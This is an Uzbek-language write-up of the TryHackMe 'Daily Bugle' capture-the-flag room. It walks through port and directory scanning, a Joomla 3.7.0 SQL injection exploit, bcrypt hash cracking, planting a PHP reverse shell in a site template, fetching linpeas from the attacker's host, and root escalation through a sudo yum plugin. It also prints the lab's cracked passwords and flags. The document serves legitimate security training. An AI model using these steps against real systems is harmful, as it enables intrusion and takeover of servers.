# Daily Bugle

Room: https://tryhackme.com/room/dailybugle



## Ishni razvetkadan boshlaymiz.

Domgidek RustScan bizga kerak bo'ladi.

```
mete@sec ~> rustscan -a 10.10.128.34 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/mete/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.128.34:22
Open 10.10.128.34:80
Open 10.10.128.34:3306
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.128.34
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 12:09 +05
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 12:09
Scanning 10.10.128.34 [2 ports]
Completed Ping Scan at 12:09, 0.13s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:09
Completed Parallel DNS resolution of 1 host. at 12:09, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:09
Scanning 10.10.128.34 [3 ports]
Discovered open port 80/tcp on 10.10.128.34
Discovered open port 3306/tcp on 10.10.128.34
Discovered open port 22/tcp on 10.10.128.34
Completed Connect Scan at 12:09, 0.13s elapsed (3 total ports)
Initiating Service scan at 12:09
Scanning 3 services on 10.10.128.34
Completed Service scan at 12:09, 7.44s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.128.34.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 12:09
Completed NSE at 12:09, 1.59s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 12:09
Completed NSE at 12:09, 2.89s elapsed
Nmap scan report for 10.10.128.34
Host is up, received syn-ack (0.13s latency).
Scanned at 2025-06-07 12:09:38 +05 for 12s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   syn-ack MariaDB 10.3.23 or earlier (unauthorized)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds
```

22,80,3306 portlari ochiq ekan.

Keling izlanishni endi 80-portda yani http bo'yicha olib boramiz.

Sayt ko'rinishi:

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/dailybugle_2.jpg)

**1-savol:** Kim bankini o'margan?

**Javob:** spiderman



Endi esa Routinglarni ko'rib chiqamiz **gobuster** dasturi orqali

Buyruq:

```
gobuster dir -u http://10.10.128.34/ -w=/usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Natija:

```
mete@sec ~> gobuster dir -u http://10.10.128.34/ -w=/usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.128.34/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 235] [--> http://10.10.128.34/images/]
/media                (Status: 301) [Size: 234] [--> http://10.10.128.34/media/]
/templates            (Status: 301) [Size: 238] [--> http://10.10.128.34/templates/]
/modules              (Status: 301) [Size: 236] [--> http://10.10.128.34/modules/]
/bin                  (Status: 301) [Size: 232] [--> http://10.10.128.34/bin/]
/plugins              (Status: 301) [Size: 236] [--> http://10.10.128.34/plugins/]
/includes             (Status: 301) [Size: 237] [--> http://10.10.128.34/includes/]
/language             (Status: 301) [Size: 237] [--> http://10.10.128.34/language/]
/components           (Status: 301) [Size: 239] [--> http://10.10.128.34/components/]
/cache                (Status: 301) [Size: 234] [--> http://10.10.128.34/cache/]
/libraries            (Status: 301) [Size: 238] [--> http://10.10.128.34/libraries/]
/tmp                  (Status: 301) [Size: 232] [--> http://10.10.128.34/tmp/]
/layouts              (Status: 301) [Size: 236] [--> http://10.10.128.34/layouts/]
/administrator        (Status: 301) [Size: 242] [--> http://10.10.128.34/administrator/]
```

## Web Hacking

Qanday routinglar bor ekanini bilib oldik. Bu sayt **Joomla** orqali qilingan, shuning uchun veb saytni endi **joomscan** dasturida skanerlaymiz.

Men Arch Linux uchun bu dasturni quyidagi buyruq bilan yuklab oldim.

```
sudo pacman -S joomscan
```

Endi keling nishon ustidan ishga tushiramiz.

```
joomscan -u http://10.10.128.34/
```

Natija:

```
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.128.34/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.10.128.34/administrator/components
http://10.10.128.34/administrator/modules
http://10.10.128.34/administrator/templates
http://10.10.128.34/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.10.128.34/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://10.10.128.34/robots.txt 

Interesting path found from robots.txt
http://10.10.128.34/joomla/administrator/
http://10.10.128.34/administrator/
http://10.10.128.34/bin/
http://10.10.128.34/cache/
http://10.10.128.34/cli/
http://10.10.128.34/components/
http://10.10.128.34/includes/
http://10.10.128.34/installation/
http://10.10.128.34/language/
http://10.10.128.34/layouts/
http://10.10.128.34/libraries/
http://10.10.128.34/logs/
http://10.10.128.34/modules/
http://10.10.128.34/plugins/
http://10.10.128.34/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/10.10.128.34/
```

> Xulosa:
>
> Berilgan hisobotga ko'ra Joomla **3.7.0** versiyasida ishlamoqda...

Keling shu versiyani qanday zaifligi bor ekanini ko'ramiz.

Qidirish:

```
site:exploit-db.com Joomla 3.7.0
```

Zaiflik: SQLinjection zaifligi bor ekan va bu haqida https://www.exploit-db.com/exploits/42033 shu yerda yozib o'tilgan.



Aynan shu versiya va zaiflik uchun githubdan tayyor eksplatatsiya topdim.

https://github.com/teranpeterson/Joomblah

Buyruq:

```
python3 joomblah.py http://10.10.128.34/
```

Natija:

```

    .---.    .-'''-.        .-'''-.
    |   |   '   _    \     '   _    \                            .---.
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \.
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |
 __.'   '                                               |/'..' / '---'/ /   | |_| |     | |
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.
|____.'                                                                `--'  `" '---'   '---'
         Original code by @stefanlucas


Fetching CSRF token
Testing SQLi
Found table: fb9j5_users
Extracting users from fb9j5_users
Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
Extracting sessions from fb9j5_session
```

Endi bizda foydalanuvchining parol hashi bor. JohnTheRipper  + Rockyou.txt qo'llaymiz.

hash.txt nomli faylga yozib olamiz hashni va johnni ishga tushiramiz.

Buyruq:

```
john hash.txt -w=/usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txt
```

Natija:

```
╭─mete   󰉖 ~/THM/THM-LABS/0706-2025/Joomblah                                                                                 
╰─ ❯❯ john hash -w=/usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
1g 0:00:02:01 DONE (2025-06-07 12:40) 0.008199g/s 384.3p/s 384.3c/s 384.3C/s wanker1..september19
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Parol: spiderman123

Endi esa admin panelga kiramiz.

URL: http://10.10.128.34/administrator/

Panelga kirib oldik, endi biz paneldan php kodlarga o'zgaritirishlar kiritamiz ya'ni zararli php kodni qo'shib qo'yamiz. Reverse shell!

```
https://github.com/akhatkulov/HackBox/blob/main/reverse-shell.php
```

Reverse Shellni qabul qilish:

```
nc -nvln 4444
```



reverse-shell.php ni o'zimizga moslab tahrirlaganimizdan so'ng endi uni saytning bir qismiga qo'shamiz.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/dailybugle_3.jpg)

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/dailybugle_4.jpg)

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/dailybugle_6.jpg)



Tahrir uchun maydon ochiladi u yerdagi kodni o'chirib tashlab o'zimizniki qo'shamiz va saqlash tugmasini bosamiz.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/dailybugle_7.jpg)



Endi esa zararlangan kodga so'rov yuboramiz browser orqali

```
http://10.10.128.34/templates/protostar/error.php
```



Va qabul qildik terminalni...

```
mete@sec ~/T/T/0706-2025> nc -nvln 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.128.34 38644
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 04:39:37 up  1:31,  0 users,  load average: 1.26, 1.19, 0.88
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$
```



## Privililage Escalation

Tizimga kirib oldik endi esa imtiyozlarni oshirish kerak.

Tizimni tahlil qilish uchun bizga linpeas.sh dasturi kerak bo'ladi. Uni kompyuterimga yuklab, serverga olib o'tishimiz kerak.



Uni yuklab olish:

```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

​    

Kompyuterimizga yuklab olgach biz o'zimizdan HTTP server ochib faylni serverga olib o'tamiz.

Http server ochish:

```
sudo python3 -m http.server 80
```

​    

Serverga yuklash:

```
wget 10.8.24.135/linpeas.sh
```

​    

Unga Execution huquqini berish:

```
chmod +x linpeas.sh
```

​    

Ishga tushurish:

```
./linpeas.sh 
```

  

Meni qiziqtirgan hisobot qismi:

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/dailybugle_8.jpg)



Userga kirish:

```
sh-4.2$ su jjameson
su jjameson
Password: nv5uz9r3ZEDzVjNu
whoami
jjameson
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash: line 2: python3: command not found

ls
jjameson
cd 
ls
user.txt
cat user.txt 
27a260fe3cba712cfdedb1c86d80442e
```

Endi esa root tomon harakatlanamiz.

**sudo -l** buyrug'i orqali imkoniyatlarni tekshiramiz.

```
sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

yum dasturini sudo bilan parolsiz ishlata olar ekanmiz.

Bundan foydalanib qanday ROOT huquqini olish esa GTFobinsda aytib o'tilgan.

Link: https://gtfobins.github.io/gtfobins/yum/#sudo


Hozir terminal abgor ahvolda uni keling sal yaxshilaymiz.

Buyruq:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

Natija:

```
[jjameson@dailybugle ~]$ 
```

Jarayon:

```
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
cat >$TF/x<<EOF
> [main]
[main]
> plugins=1
plugins=1
> pluginpath=$TF
pluginpath=$TF
> pluginconfpath=$TF
pluginconfpath=$TF
> EOF
EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
cat >$TF/y.conf<<EOF
> [main]
[main]
> enabled=1
enabled=1
> EOF   
EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
cat >$TF/y.py<<EOF
> import os
import os
> import yum
import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
requires_api_version='2.1'
> def init_hook(conduit):
def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
  os.execl('/bin/sh','/bin/sh')
> EOF

EOF
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
whoami
root
sh-4.2# 
```

Vanihoyat:

```
sh-4.2# cat /root/root.txt
cat /root/root.txt
eec3d53292b1821868266858d7fa6f79
```



### Nafas olar ekanman, men yana davom etaman...
